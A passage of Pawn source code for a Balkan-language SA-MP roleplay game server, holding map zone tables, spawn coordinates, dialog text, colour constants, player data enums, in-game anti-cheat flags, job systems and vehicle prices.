    {"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
    {"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
    {"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
    {"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
    {"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
    {"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
    {"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
    {"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
    {"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
    {"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
    {"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
    {"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
    {"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
    {"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
    {"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
    {"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
    {"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
    {"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
    {"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
    {"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
    {"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
    {"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
    {"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
    {"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
    {"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
    {"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
    {"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
    {"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
    {"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
    {"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
    {"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
    {"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
    {"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
    {"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
    {"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
    {"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
    {"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

new Float:SpawnBolnica[ 3 ][ 3 ] = {
    { -2272.7239, 98.7313, -4.6833 },
    { -2272.9255, 101.8626, -4.6833 },
    { -2272.8877, 105.0981, -4.6833 }
};

new Float:RandomRudnik[ 6 ][ 3 ] = {

    { 988.8754, 315.4094, -35.0328 },
    { 992.8870, 315.0030, -34.1968 },
    { 993.2216, 321.8622, -35.7364 },
    { 987.4739, 322.4483, -35.6047 },
    { 983.5125, 327.0069, -36.1943 },
    { 980.1337, 321.6145, -36.9910 }
};

new Float:RandomDMPos[ 10 ][ 3 ] = {
    { -382.7271, 2274.1548, 41.5471 },
    { -394.9037, 2257.2969, 42.2798 },
    { -396.4926, 2230.7151, 43.1595 },
    { -414.2215, 2221.9216, 42.4297 },
    { -436.2568, 2243.3733, 42.4297 },
    { -457.3188, 2231.3545, 44.5985 },
    { -396.8878, 2192.7390, 42.4176 },
    { -361.7321, 2202.5627, 42.4844 },
    { -325.0925, 2215.3992, 44.0645 },
    { -355.6452, 2220.9185, 49.2862 }
};

new Float:RandomAFKZone[ 53 ][ 3 ] = {
    { 1730.1456,-1659.6969,20.2397 },
    { 1727.7513,-1651.9196,20.2299 },
    { 1726.7904,-1649.3760,20.2322 },
    { 1721.7285,-1648.6044,20.2282 },
    { 1718.5098,-1646.6769,20.2273 },
    { 1713.7710,-1649.8018,20.2279 },
    { 1715.0129,-1653.6700,20.2227 },
    { 1715.1097,-1657.7659,20.2228 },
    { 1715.2035,-1661.7488,20.2288 },
    { 1715.2915,-1665.4894,20.2269 },
    { 1714.6241,-1668.3933,20.2255 },
    { 1722.3838,-1673.0726, 23.6953 },
    { 1716.7896,-1673.0103, 23.6953 },
    { 1711.6324,-1672.6580, 23.7049 },
    { 1709.9771,-1669.4884, 23.7027 },
    { 1709.4767,-1663.6036, 23.7023 },
    { 1709.0681,-1659.0173, 23.7021 },
    { 1709.6382,-1652.6377, 23.6953 },
    { 1710.0719,-1647.7860, 23.6953 },
    { 1711.8132,-1644.6721, 23.6882 },
    { 1716.3827,-1640.8685, 23.6911 },
    { 1721.7980,-1640.7451, 23.6959 },
    { 1728.8870,-1640.0542, 23.7373 },
    { 1733.5642,-1643.3423, 23.7481 },
    { 1733.5536,-1648.1727, 23.7387 },
    { 1733.5106,-1654.5677, 23.7296 },
    { 1733.0682,-1662.7927, 23.7112 },
    { 1721.1396,-1660.3567, 20.2306 },
    { 1718.0803,-1655.7264, 20.1501 },
    { 1721.7438,-1651.4983, 20.0934 },
    { 1725.2799,-1655.4889, 20.0625 },
    { 1712.9745,-1673.1198, 27.2055 },
    { 1716.2690,-1673.0341, 27.2052 },
    { 1719.9147,-1672.9789, 27.2063 },
    { 1722.9498,-1672.6964, 27.2047 },
    { 1726.1809,-1671.0621, 27.1953 },
    { 1729.7810,-1667.7145, 27.2010 },
    { 1733.1187,-1664.5486, 27.2140 },
    { 1733.4927,-1660.4409, 27.2252 },
    { 1733.7899,-1654.8900, 27.2309 },
    { 1733.8026,-1650.1589, 27.2378 },
    { 1733.8157,-1645.2821, 27.2399 },
    { 1733.5480,-1640.8468, 27.2502 },
    { 1729.6189,-1640.1465, 27.2498 },
    { 1725.2853,-1640.3112, 27.2165 },
    { 1720.8525,-1640.4642, 27.1966 },
    { 1715.5104,-1641.0824, 27.2133 },
    { 1712.0817,-1644.7480, 27.2019 },
    { 1709.9279,-1649.0500, 27.1953 },
    { 1709.5186,-1654.9104, 27.1953 },
    { 1709.6089,-1661.3516, 27.1953 },
    { 1709.6362,-1665.8845, 27.1953 },
    { 1709.6707,-1671.6222, 27.1953 }
};

new Float:RandomZatvor[ 5 ][ 3 ] = {
    {-1462.2644,-1561.0515,101.8390},
    {-1458.6205,-1519.4579,101.8390},
    {-1458.1010,-1467.0884,101.7578},
    {-1425.0217,-1458.6273,101.6810},
    {-1416.5483,-1548.7537,101.7578}
};

new Float:RandomPrison[5][3] = {
    {2952.9758,-2929.4207,10.7636},
    {2953.8655,-2885.4653,10.1145},
    {2988.7764,-2866.6387,10.9493},
    {3007.7268,-2832.0405,10.1785},
    {2967.1018,-2822.1091,10.5194}
};

new Float:RandomLSSpawn1[ 6 ][ 3 ] = {
	{2357.9990,-1777.2567,13.2818 }, // LS
	{2354.6934,-1796.7274,13.3322 }, // LS
	{2334.9312,-1790.1195,13.3361 },
    {2315.4573,-1780.9962,13.3217},
    {2301.2693,-1793.0165,13.3217},
    {2313.4348,-1804.4788,13.3217}
};

new Float:RandomLSSpawn2[ 6 ][ 3 ] = {
	{2357.9990,-1777.2567,13.2818 }, // LS
    {2354.6934,-1796.7274,13.3322 }, // LS
    {2334.9312,-1790.1195,13.3361 },
    {2315.4573,-1780.9962,13.3217},
    {2301.2693,-1793.0165,13.3217},
    {2313.4348,-1804.4788,13.3217}
};

new Float:RandomSFSpawn[ 4 ][ 3 ] = {
	{-2722.4272, 368.2627, 4.3964}, // SF
	{-2694.1816, 366.7715, 4.4007}, // SF
	{-2695.6519, 386.0594, 4.3672}, // SF
	{-2716.8711, 385.5885, 4.3672} // SF
};


//=============================[ Strings ]======================================

new DialogTekstovi[ 2 ][ ] = {

	"Sada se mozete ulogirati upisivanjem vase lozinke u\n\
	polje ispod. Imate 60 sekundi da se ulogirate, \n\
	u protivnom cete biti izbaceni.\n\n\
	Imate %d pokusaja upisavanja lozinke, ukoliko \n\
	je svaki put upisete pogresno, takoder cete biti izbaceni!\n\n\
	Ako zelite odustati, mozete izabrati 'Odustani',\n\
	ako zelite nastaviti, nakon upisivanja lozinke izaberite\n\
	'Potvrdi'.",

	//--------------------------------------------------------------------------

	"Dobrodosli na server, ako su vam neke stvari nejasne, mozete\n\
 	pitati ADMIN TEAM ili suigraca za pomoc. Ako bi slucajno nasli gresku u\n\
 	skripti, molimo Vas da ju istog trenutka prijavite bilo kojem clanu Valhalla tima.\n\
 	Ukoliko iskoristavate neku gresku (BUG), biti cete kaznjeni najvecom mogucom kaznom.\n\
 	Zelimo Vam puno srece u daljnjem igranju, ne zaboravite na pravila roleplay-a i ugodno\n\
 	se zabavite! Valhalla tim!"

};

new sDStrg[ 512 ];

//===============================[ Boje ]=======================================

#define CRVENA                                                        0xfa5555AA
#define ZELENA                                                     	  0x33AA33AA
#define BELA                                                          0xFFFFFFFF
#define CRNA 														  0x000000FF
#define PLAVA                                                         0xA9C4E4FF
#define NARANDZASTA1                        						  0xFF9933AA
#define SIVA                                                          0xAFAFAFAA
#define ZUTA                                                          0xFFFF00AA
#define SUPPORTER 													  0x8EFF00FF
#define NARANDZASTA                                                   0xFFAF00FF
#define LJUBICASTA                  								  0xC2A2DAAA
#define SVETLOPLAVA                  								  0x33CCFFAA
#define SVETLOCRVENA  												  0xFF6347AA

#define VlasnikBoja                                                   0xFF8000FF
#define SuvlasnikBoja                                                 0x339CD4FF
#define AdminBoja                                                     0xFF0000FF

#define SRVBOJA1                                                      0xB2A8C7FF  
#define SRVBOJA2													  0x2EFFFFFF

#define ANTICHEAT 													  0xDC143CAA
#define NARACRVENA 	                                                  0xFF4500AA
#define WARLJUB 										  			  0x8B008BAA


#define col_ljub						  "{9000FF}"
#define col_pitaj                         "{2BFF36}"
#define col_orange						  "{FFAF00}"
#define col_splava                        "{33CCFF}"
// FF0000
//===============================[ Enum ]=======================================

enum xPlayerInfo{
	xLozinka[ LOZINKA_STRING ],
	xPol,
	xGodine,
	xNovac,
	xLevel,
	xRespekt,
	xPoboljsanja,
	xPayDay,
	xAdmin,
	xSkin,
	xSpawn,
	xLider,
	xClan,
	xRank,
	xVoziloID[ 4 ],
	xMaterijali,
	xFirmaID,
	xPosao,
	xUgovor,
	xMehSkill,
	xMDelovi,
	xHead,
	Float:xHeadPos[9],
	xFace,
	Float:xFacePos[9],
	xSungMask,
	Float:xSungMaskPos[9],
	xCigare,
	xUpaljac,
	xBStil,
	xRegistrovan,
	Float:xSHealth,
	xBrojTelefona,
	xVozacka,
	xMotorska,
	xKamionskaC1,
	xKamionskaC2,
	xKamionskaC3,
	xBrodska,
	xLetelica,
	xOsnovna,
    xSrednja,
    xFakultet,
	xSkolaLimit,
	xUbijen,
	xDrug[5],
	xDrugCode[5],
	xSolna,
	xPseudo,
	xSodaB,
	xCrveniF,
	xLysAcid,
	xDesVoda,
	xMarihuana,
	xOpium,
	xKalcij,
	xAmonijH,
	xKokain,
	xKokain2,
	xMetilAmin,
	xHunger,
	bool:xHeroinAddict,
	xHeroinUsed,
	xHeroinIndicator,
	bool:xCokeCrackAddict,
	xCokeCrackUsed,
	xCokeCrackIndicator,
	bool:xMethAddict,
	xMethIndicator,
    xMethUsed,
    bool:xInekcija,
    bool:xToolkit,
    xProperty[ 3 ],
    xObject[ 10 ],
    bool:xGunLicense,
    xTelefonBon,
    xModelTelefona,
    xSnaga,
    xZatvor,
    xZatvorVreme,
    xWanted,
    xUhapsen,
    xPDUhapsio,
    xPDStatsTicket,
	xPDStatsTicketMoney,
	xTakenWeps,
    xTakenDrugs,
    xPocetniTut,
    xAKod,
    xSat,
    xMaskID,
    xBRacun,
    xPreostaloZaOtplatu,
    xIznosRate,
    xIznosKredita,
    xOnlineSati,
    xSupporter,
    xRPLearn,
    xWarn,
    xMute,
    Float:xMarker[ 3 ],
    xBrojNews,
    xOrgUgovor,
	xHelmet,
	xBDays,
	xBMonths,
	xBYears,
	xGradRank,
	xSkriptaRank,
	xUlazBL,
	bool:xBoombox,
	Float:xHelmetPos[ 9 ],
	xDrzava,
	xEmail[ 34 ],
	xVIPLevel,
    xVIPVreme,
	xHitmenCena,
	xLesLimit,
	xKazneniUgovor,
	xOffPJail[ 64 ],
	xOffPPrison[ 64 ],
	xOffPMute[ 64 ],
	xStaffMin,
	xLastLogin[ 64 ],
	bool:xMarried,
	xMarriedTo[ 24 ],
	bool:xTogMob,
	xHotelID,
	xHotelRoom,
	xPromoter,
	xFieldID,
	xSljive,
	xKruske,
	xJabuke,
	xKupus,
	xRuze,
	xSemeSljive,
	xSemeKruske,
	xSemeJabuke,
	xSemeKupusa,
	xSemeRuze,
	xLottoNumber,
	xLottoMoney,
	xGarageID,
    xWorkShopID,
	bool:xImaBRacun,
	xPlatniRacun,
	bool:xDonatorSlot,
	xPljackaVreme,
	bool:xLeaveJail,
	xBailPrice,
	xHangarTime,
	xEvent1Mesto,
	xEvent2Mesto,
	xEvent3Mesto,
	xDMEventUbistva,
	xRentID,
	xZlato,
	xRezervniKljucevi,
	xRadarBodovi,
	bool:xDBO,
	xDBoja,
	xSpawned,
	xSpecAdmin,
	xLicnaKarta,
	xPasos,
	xLaptop,
	xDinamit,
	xLaznaLicna,
	xLazniPasos,
	xSeme,
	xNeoDroga,
	xDrogaPosao,
	xAdminDuty,
	xRobanjeKuce,
    xTurpija,
    xPosadioDrogu,
    xPosadioDrogu2,
    xMichaelMisijaSpawn,
    xRobanjeMarketa,
    xDronAuto,
    xDronAvion,
    xDronHelis,
    xBaterija,
    xToken,
    xJobSkill,
    xDeliveryBroj,
    xMedKit,
    xPrljavNovac,
    xRobanjeTrafike,
    xKokainPrerada,
    xKokainPreradaVreme,
    xKokainPreradjeni,
    xBitcoin,
    xWorkShopGarage,
    xKey,
    xDeonice,
    xAchivements[17],
    xParadox,
    xSkate,
    xRepairKit,
    xOrgPoen,
    xSkillWorkAholic,
    xSkillSpeech,
    xSkillDrive,
    xSkillStamina,
    xSkillPoen,
    xDisarm,
    xYoutuber,
    xAdminWarn,
    xNaftaID,
    xKantica,
    xRanac,
    xInventory[8],
    xInventoryAmmo[8],
    xDilerUkrao,
    xPolicijaTest
}
new PlayerInfo[ MAX_PLAYERS ][ xPlayerInfo ];

stock GetPlayerLeader( playerid ) {
    if(PlayerInfo[playerid][xRank] >= 5) return PlayerInfo[playerid][xClan];
    return 0;
}

stock GetPlayerMember( playerid ) {
    return PlayerInfo[playerid][xClan];
}

#define GRAD_MAYOR      6
#define GRAD_VMAYOR     5
#define GRAD_LBODYGUARD 4
#define GRAD_LDRIVER    3
#define GRAD_DRIVER     2
#define GRAD_BODYGUARD  1

static const g_aWeaponSlots[] = {
	0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 10, 10, 10, 10, 10, 10, 8, 8, 8, 0, 0, 0, 2, 2, 2, 3, 3, 3, 4, 4, 5, 5, 4, 6, 6, 7, 7, 7, 7, 8, 12, 9, 9, 9, 11, 11, 11
};

enum _weaponInfos{
	wName[24],
	wID,
	wSlot,
	wModel
}

new WeaponInfos[ 47 ][ _weaponInfos ] = {
	{"None", 0, 0, 0 },
	{"Brass Knuckles", 1, 0, 331 },
	{"Golf Club", 2, 1, 333 },
	{"Nightstick", 3, 1, 334 },
	{"Knife", 4, 1, 335 },
	{"Baseball Bat", 5, 1, 336 },
	{"Shovel", 6, 1, 337 },
	{"Pool Cue", 7, 1, 338 },
	{"Katana", 8, 1, 339 },
	{"Chainsaw", 9, 1, 341 },
	{"Double-ended Dildo", 10, 10, 321 },
	{"Dildo", 11, 10, 321 },
	{"Vibrator", 12, 10, 323 },
	{"Silver Vibrator", 13, 10, 324 },
	{"Flowers", 14, 10, 325 },
	{"Cane", 15, 10, 326 },
	{"Grenade", 16, 8, 342 },
	{"Tear Gas", 17, 8, 343 },
	{"Molotov Cocktail", 18, 8, 344 },
	{"None", 19, -1, 0 },
	{"None", 20, -1, 0 },
	{"None", 21, -1, 0 },
	{"Colt .45", 22, 2, 346 },
	{"Silenced Colt .45", 23, 2, 347 },
	{"Desert Eagle", 24, 2, 348 },
	{"Shotgun", 25, 3, 349 },
	{"Sawnoff Shotgun", 26, 3, 350 },
	{"Combat Shotgun", 27, 3, 351 },
	{"Micro SMG", 28, 4, 352 },
	{"MP5", 29, 4, 353 },
	{"AK47", 30, 5, 355 },
	{"M4", 31, 5, 356 },
	{"Tec-9", 32, 4, 372 },
	{"Country Rifle", 33, 6, 357 },
	{"Sniper Rifle", 34, 6, 358 },
	{"RPG", 35, 7, 359 },
	{"HS Rocket", 36, 7, 0 },
	{"Flamethrower", 37, 7, 361 },
	{"Minigun", 38, 7, 362 },
	{"Satchel Charge", 39, 8, 363 },
	{"Detonator", 40, 12, 364 },
	{"Spraycan", 41, 9, 365 },
	{"Fire Extinguisher", 42, 9, 366 },
	{"Camera", 43, 9, 367 },
	{"Night Vis Goggles", 44, 11, 368 },
	{"Thermal Goggles", 45, 11, 369 },
	{"Parachute", 46, 11, 371 }
};

enum aPlayerInfo {
    aTBan,
    aTWarn,
    aTKick,
    aTCharge,
    aTJail,
    aTUnjail,
    aTUnwarn,
    aTUnban,
    aTPM
}
new AI[ MAX_PLAYERS ][ aPlayerInfo ];

enum lala123 {
	Pol, 
	Level,  
	OnlineSati,
	Respekt,  
	Novac, 
	Banka,
	Upozorenja,
	Posao,
	Posaougovor,
	Godine, 
	Organizacija,
	Rank,
	Imovina1,
	Imovina2,
	Imovina3,
	Vozilo1,
	Vozilo2,
	Vozilo3,
	Vozilo4,
	Firma,
	StaffMin,
	LastLogin[ 64 ],
	Admin,
	GameSage,
	Hotel,
	eMail[ 34 ]
}
new OfflineCheck[ lala123 ];

#define IsValidWeapon(%0) (%0>=1 && %0<=18 || %0>=21 && %0<=46)

#define MAX_W_SLOTS 13

enum antiC {
	EnterVehTime,
	EnteredVehicle,
	TakeVehicle,
	SpamChat,
	SpamCommand,
	Weapon[ 13 ],
	Ammo[ 13 ],
	WeaponCheck,
	WeaponDetect,
	WeaponHack,
	TakenWeapon,
	TeleportCheck,
	Float:TeleportPos[ 3 ],
	TeleportHack,
	Float:TrueHealth,
	Float:TrueArmour,
	SpeedHack,
	AFKMinute,
	HighPing,
	bool:InTuningGarage,
	Float:AFKFirstPos[ 3 ],
	Float:AFKSecondPos[ 3 ],
	Float:SpeedPos[ 3 ],
	bool:SpeedFall,
	LastWShot,
	CPPort,
	SpamVehicle,
	LastAmmo,
	LastAmmoChecks,
	bool:RemoveVehicle,
	CPSCount,
	CPSTick,
	CWTime,
    CWVehID,
    ArmedWeapon,
    VehRepairTime
}
new antiCheatCS[ MAX_PLAYERS ][ antiC ];
new BusyVehicle[ MAX_VEHICLES ];

enum antiVS {
    Float:VehTrueHealth,
	VehCheck
}
new antiCheatVS[ MAX_VEHICLES ][ antiVS ];

new Float:RealVehiclePositions[ MAX_VEHICLES ][ 3 ];
new LastPullingVehicle[ MAX_VEHICLES ];

#define AC_ADMINPORUKA 0
#define AC_KICK 1
#define AC_BAN 2

#define DETECT_WEAPON_HACK 	    1
#define DETECT_AMMO_HACK   	    2
#define DETECT_TELEPORT_HACK    3
#define DETECT_FLY_HACK 	    4
#define DETECT_SPEED_HACK   	5
#define DETECT_JETPACK_HACK 	6
#define DETECT_VEHREPAIR_HACK   7

enum antiSS {
	WeaponHRezimRada,
	TeleportHRezimRada,
	HealthHRezimRada,
	SpeedHRezimRada,
	JetPackHRezimRada,
	MoneyHRezimRada,
	FlyHRezimRada,
	TuningHRezimRada,
	VehRepRezimRada,
	bool:antiWeaponH,
	bool:antiTeleportH,
	bool:antiHealthH,
	bool:antiArmourH,
	bool:antiSpeedH,
	bool:antiJetPackH,
	bool:antiMoneyH,
	bool:antiFlyH,
	bool:antiTuningH,
	bool:antiVehRepair
}
new antiCheatSS[ antiSS ];

#define MaxBrojKreiranih 1980

enum Serva {
	// save
	RegistrovanihKorisnika,
	BanovanihKorisnika,
	KikovanihKorisnika,
	BrojWarnova,
	BrojPosetaServeru,
	bool:HappyHours,
	PocetniLevel,
	PocetniNovaca,
	bool:KupovinaVozila,
	bool:Report,
	bool:Pitanja,
	bool:Oglasi,
	RekordServera,
	bool:Registracija,
	Gorivo,
	Drva,
	Zlato,
	ReactTime,
	ReactName[ MAX_PLAYER_NAME ],
	// dont save
	Text3D:GorivoLabel[ 14 ],
	Text3D:ZlatoLabel,
	BrojImovina,
	BrojKontejnera,
	BrojKreiranihVozila,
	Prognozasys,
	VremeInGame,
	bool:RRVehicle,
    HappyJob,
    SrecniID,
    cenaDeonicaMAX,
    cenaDeonicaMIN
}
new ServerInfo[ Serva ];

enum rInfo {
    sCreated,
    Float:sX,
    Float:sY,
    Float:sZ,
    sObject,
};
new Roadblocks[ 100 ][ rInfo ];

enum BoomboxInfao {
	boomboxPlaced,
	Float:boomboxPos[ 3 ],
	boomboxInterior,
	boomboxWorld,
	boomboxObject,
	boomboxURL[128 char],
	Text3D:boomboxText3D
};
new BoomboxInfo[ MAX_PLAYERS ][ BoomboxInfao ];
new Boombox[ MAX_PLAYERS ];

enum rudarBre {
	rudarTimer,
	rudarIskopano,
	rudarObjects[ 3 ]
};
new rudarPosao[ MAX_PLAYERS ][ rudarBre ];

#define MAX_EVENTS      100
#define MAX_CP          202
#define MAX_TIME        23
#define EVENT_FILE      "Events/%d.ini"
new
	EventName[ MAX_PLAYERS ][ 64 ],
	EventCP[ MAX_PLAYERS ],
	EventCarsCreate[ MAX_PLAYERS ],
	EventID[ MAX_PLAYERS ],
	PlayerCP[ MAX_PLAYERS ],
	PlayerEventVehID[ MAX_PLAYERS ],
	EventVehID[ MAX_PLAYERS ],
	bool:PlayerCreateEvent[ MAX_PLAYERS ],
	Float:PlayerPos[ MAX_PLAYERS ][ 3 ],
	PlayerPosInt[ MAX_PLAYERS ],
	PlayerPosVW[ MAX_PLAYERS ];

enum jao {
	Drivers,
	Position,
	EventTime,
	eID,
	Vehicle[ 30 ]
}
new EventInfo[ jao ];

enum jo {
	Float:TCPX,
	Float:TCPY,
 	Float:TCPZ,
 	Float:TCPA,
 	Float:TCPX2,
	Float:TCPY2,
 	Float:TCPZ2,
 	Float:TCPA2,
 	Name[ 64 ],
 	VehID,
 	MaxCP,
 	Float:PrivremeniX1,
 	Float:PrivremeniY1,
 	Float:PrivremeniX2,
 	Float:PrivremeniY2
}
new Event[ MAX_EVENTS ][ jo ];

enum ev
{
 	Float:CPX,
 	Float:CPY,
 	Float:CPZ,
}
new CheckPoint[ MAX_EVENTS ][ MAX_CP ][ ev ];

enum pCrime
{
	pAccusing[32],
	pDone,
	pLocation[32]
};
new PlayerCrime[ MAX_PLAYERS ][pCrime];

enum pAmbulance {
	pVictimLocation[ 32 ],
}
new PlayerInjured[ MAX_PLAYERS ][ pAmbulance ];

enum zlInfo {
	zPocinio[ MAX_PLAYER_NAME ],
	zPrijavio[ MAX_PLAYER_NAME ],
	zZlocin[ 64 ],
};
new ZlocinInfo[ MAX_PLAYERS ][ zlInfo ];

enum e_garbagemanInfo {
	bool:gmiDuty,
	bool:gmiReadyToDump,
	bool:gmiHasGarbage,
	bool:gmiJob,
	gmiContainerID,
	gmiVehicleID
};
new garbagemanInfo[ MAX_PLAYERS ][ e_garbagemanInfo ];

enum g_Veh {
	gGarbages,
	gPlayerID
};
new garbagemanVehicles[ MAX_VEHICLES ][ g_Veh ];

#define MAX_FARMERS_PLANTS_PLANTED				10
#define MAX_FARMS 						      1000

enum ea_farmerInfo {
	farmPlayerID,
	bool:farmPlantCreated,
	bool:farmWheatCreated,
	farmObject,
	Text3D:farm3D
};
new plantInfo[ MAX_FARMS ][ ea_farmerInfo ];

enum e_farmerInfo {
	fiFarmerSeeds,
	fiFarmerPlantsPlanted,
	fiFarmerWheatCreated,
	fiFarmerPickupedBales,
	bool:fiFarmerPickupedBale,
	fiCowNumber,
	fiVehicleBucket,
	fiBucketObject,
	bool:fiHaveBucket
};
new farmerInfo[ MAX_PLAYERS ][ e_farmerInfo ];

enum aa {
	fvSeeds,
	bool:fvMilk,
	fvMilkpID
};
new farmerVehicles[ MAX_VEHICLES ][ aa ];

new SSB, KosacMost, ZgradaNeka, GSFMost, SpawnZona, AdminBaza, GradjPosao, FarmerPosao, BinaBre, MafijaTSM, MafijaY, VIPBaza, FBIBaza;
new DilerActor;

enum aeass32 {
	Float:cpPos[ 3 ],
	Float:obPos[ 3 ]
};

new milkInfo[ 14 ][ aeass32 ] ={
	{ {-1083.4468, -1260.1689, 129.2188}, {-1083.79199, -1258.82507, 128.05800} },
	{ {-1076.3959, -1260.4109, 129.2188}, {-1074.92859, -1259.36865, 128.05800} },
	{ {-1072.8464, -1268.4139, 129.2188}, {-1071.94824, -1268.39148, 128.05800} },
	{ {-1072.7910, -1277.3185, 129.2188}, {-1072.30945, -1277.53979, 128.05800} },
	{ {-1085.5800, -1278.3676, 129.2188}, {-1085.89087, -1278.27747, 128.05800} },
	{ {-1097.0688, -1278.0977, 129.2188}, {-1097.52966, -1277.73108, 128.05800} },
	{ {-1106.6710, -1278.5554, 129.2188}, {-1107.13867, -1278.24841, 128.05800} },
	{ {-1116.2678, -1278.1232, 129.2188}, {-1116.92029, -1277.01501, 128.05800} },
	{ {-1116.1692, -1268.8348, 129.2188}, {-1116.26758, -1266.98450, 128.05800} },
	{ {-1111.1566, -1260.9063, 129.2188}, {-1110.46655, -1259.03979, 128.05800} },
	{ {-1103.8966, -1260.1794, 129.2188}, {-1103.06042, -1258.46045, 128.05800} },
	{ {-1104.8306, -1268.9554, 129.2188}, {-1104.32874, -1269.13904, 128.05800} },
	{ {-1093.1650, -1269.3164, 129.2188}, {-1092.83740, -1269.42151, 128.05800} },
	{ {-1083.9492, -1270.6510, 129.2188}, {-1082.86694, -1269.04285, 128.05800} }

};

new hitfound = 0;
new ahitid = 999;

enum HitmanInfoa {
	GotHit,
	GetChased,
	GoChase,
	PlacedNews
};
new HitmanInfo[ MAX_PLAYERS ][ HitmanInfoa ];

enum xtruck { 
	bool:tHasCargo,
	tPlacedCargos,
	tID
}
new Trucker[ MAX_PLAYERS ][ xtruck ];

enum t_Veh {
	tCargoPlaced[ 10 ],
	tID[ 10 ]
};
new truckerVehicle[ MAX_VEHICLES ][ t_Veh ];

new bool:pizzaVehicle[ MAX_VEHICLES ];

new LastCar[ MAX_PLAYERS ];

#define MAX_INTERIJERA 														 100
enum iinfo {
	iIme[32],
	Float:iXUlaz,
	Float:iYUlaz,
	Float:iZUlaz,
	Float:iAUlaz,
	Float:iXIzlaz,
	Float:iYIzlaz,
	Float:iZIzlaz,
	Float:iAIzlaz,
	iIntID,
	iIntIDSpolja,
	iVwID,
	iVwIDSpolja,
	iPickup,
	iPickupID,
	i3dLabel,
    i3dLabelID
};
new IntInfo[ MAX_INTERIJERA ][ iinfo ];
new intide;

//Cene vozila

new VehPrice[ 212 ][ 2 ] = {
    { 400, 320000 }, // Landstalker
    { 401, 290000 }, // Bravura
    { 402, 480000 }, // Buffalo
    { 403, 0 }, // Linerunner
    { 404, 250000 }, // Perenniel
    { 405, 195000 }, // Sentinel
    { 406, 0 }, // Dumper edit
    { 407, 0 }, // Firetruck edit
    { 408, 0 }, // Trashmaster edit
    { 409, 600000 }, // Stretch
    { 410, 110000 }, // Manana
    { 411, 5200000 }, // Infernus
    { 412, 230000 }, // Voodoo
    { 413, 115000 }, // Pony
    { 414, 95000 }, // Mule
    { 415, 1000000 }, // Cheetah
    { 416, 0 }, // Ambulance
    { 417, 3500000 }, // Leviathan
    { 418, 210000 }, // Moonbeam
    { 419, 210000 }, // Esperanto
    { 420, 0 }, // Taxi
    { 421, 180000 }, // Washington
    { 422, 215000 }, // Bobcat
    { 423, 0 }, // Mr Whoopee edit
    { 424, 810000 }, // BF Injection edit
    { 425, 0 }, // Hunter edit
    { 426, 220000 }, // Premier
    { 427, 0 }, // Enforcer edit
    { 428, 0 }, // Securicar edit
    { 429, 3100000 }, // Banshee
    { 430, 245000 }, // Predator edit
    { 431, 0 }, // Bus edit
    { 432, 0 }, // Rhino edit
    { 433, 0 }, // Barracks
    { 434, 285000 }, // Hotknife
    { 435, 0 }, // Article Trailer edit
    { 436, 155000 }, // Previon edit
    { 437, 0 }, // Coach edit
    { 438, 0 }, // Cabbie
    { 439, 225000 }, // Stallion
    { 440, 0 }, // Rumpo
    { 441, 0 }, // RC Bandit edit
    { 442, 0 }, // Romero
    { 443, 0 }, // Packer
    { 444, 0 }, // Monster edit
    { 445, 215000 }, // Admiral
    { 446, 600000 }, // Squallo edit
    { 447, 3000000 }, // Seasparrow edit
    { 448, 0 }, // Pizzaboy
    { 449, 0 }, // Tram edit
    { 450, 0 }, // Article Trailer 2 edit
    { 451, 4800000 }, // Turismo
    { 452, 450000 }, // Speeder edit
    { 453, 220000 }, // Reefer edit
    { 454, 800000 }, // Tropic edit
    { 455, 0 }, // Flatbed
    { 456, 0 }, // Yankee
    { 457, 60000 }, // Caddy edit
    { 458, 180000 }, // Solair edit
    { 459, 0 }, // Topfun Van (Berkley's RC)
    { 460, 640000 }, // Skimmer edit
    { 461, 910000 }, // PCJ-600
    { 462, 200000 }, // Faggio
